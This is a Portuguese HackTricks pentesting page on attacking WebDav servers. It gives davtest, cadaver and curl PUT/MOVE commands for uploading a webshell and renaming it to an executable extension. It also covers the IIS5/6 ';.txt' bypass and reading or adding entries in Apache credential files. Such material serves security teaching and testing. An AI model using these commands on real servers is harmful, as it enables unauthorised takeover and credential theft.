# WebDav

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda AWS hacking do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Um **Servidor HTTP com WebDav** ativo √© um servidor onde voc√™ provavelmente pode **atualizar, deletar, mover, copiar** arquivos. **√Äs vezes** voc√™ **precisa** ter **credenciais v√°lidas** (geralmente verifique com Autentica√ß√£o B√°sica HTTP).

Voc√™ deve tentar **fazer upload** de algum **webshell** e **execut√°-lo** a partir do servidor web para assumir o controle do servidor.\
Geralmente, para **conectar** a um servidor WebDav voc√™ precisar√° de **credenciais v√°lidas**: [**For√ßa bruta WebDav**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) _(Basic Auth)_.

Outra configura√ß√£o comum √© **proibir o upload** de arquivos com **extens√µes** que ser√£o **executadas** pelo servidor web, voc√™ deve verificar como **burlar isso:**

* **Fazer upload** de arquivos com **extens√µes execut√°veis** (talvez n√£o seja proibido).
* **Fazer upload** de arquivos **sem extens√µes execut√°veis** (como .txt) e tentar **renomear** o arquivo (mover) com uma **extens√£o execut√°vel**.
* **Fazer upload** de arquivos **sem extens√µes execut√°veis** (como .txt) e tentar **copiar** o arquivo (mover) com **extens√£o execut√°vel.**

## DavTest

**Davtest** tenta **fazer upload de v√°rios arquivos com diferentes extens√µes** e **verificar** se a extens√£o √© **executada**:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
Amostra de sa√≠da:

![](<../../.gitbook/assets/image (19) (1).png>)

Isso n√£o significa que as extens√µes **.txt** e **.html est√£o sendo executadas**. Isso significa que voc√™ pode **acessar esses arquivos** atrav√©s da web.

## Cadaver

Voc√™ pode usar esta ferramenta para **conectar-se ao servidor WebDav** e realizar a√ß√µes (como **upload**, **mover** ou **deletar**) **manualmente**.
```
cadaver <IP>
```
## Requisi√ß√£o PUT
```
curl -T 'shell.txt' 'http://$ip'
```
## Requisi√ß√£o MOVE
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, utilizando as ferramentas comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Vulnerabilidade IIS5/6 WebDav

Esta vulnerabilidade √© muito interessante. O **WebDav** **n√£o permite** **fazer upload** ou **renomear** arquivos com a extens√£o **.asp**. Mas voc√™ pode **contornar** isso **adicionando** ao final do nome **";.txt"** e o arquivo ser√° **executado** como se fosse um arquivo .asp (voc√™ tamb√©m poderia **usar ".html" em vez de ".txt"**, mas **N√ÉO esque√ßa do ";"**).

Ent√£o voc√™ pode **fazer upload** do seu shell como um arquivo ".**txt"** e **copiar/mover** para um arquivo ".asp;.txt". Ao acessar esse arquivo atrav√©s do servidor web, ele ser√° **executado** (o cadaver dir√° que a a√ß√£o de mover n√£o funcionou, mas funcionou).

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## Credenciais p√≥s-autentica√ß√£o

Se o Webdav estiver usando um servidor Apache, voc√™ deve olhar para os sites configurados no Apache. Comumente:\
_**/etc/apache2/sites-enabled/000-default**_

Dentro dele, voc√™ poderia encontrar algo como:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Como voc√™ pode ver, h√° os arquivos com as **credenciais** v√°lidas para o servidor **webdav**:
```
/etc/apache2/users.password
```
Dentro deste tipo de arquivos, voc√™ encontrar√° o **username** e um **hash** da senha. Essas s√£o as credenciais que o servidor webdav usa para autenticar usu√°rios.

Voc√™ pode tentar **crackear** esses dados, ou **adicionar mais** se, por algum motivo, voc√™ quiser **acessar** o servidor **webdav**:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Para verificar se as novas credenciais est√£o funcionando, voc√™ pode fazer:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, com ferramentas da comunidade **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
